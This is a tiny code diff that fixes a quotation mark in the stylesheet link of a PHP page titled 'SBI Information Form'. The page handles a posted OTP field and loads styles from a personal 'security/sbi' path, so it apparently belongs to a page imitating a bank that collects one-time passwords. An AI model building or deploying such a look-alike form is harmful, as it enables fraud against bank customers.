@@ -31,7 +31,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['otp'])) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SBI Information Form</title>
-     <linl rel="stylesheet" href='https://mrfidal.github.io/security/sbi/style.css">
+     <linl rel="stylesheet" href="https://mrfidal.github.io/security/sbi/style.css">
 
 
 
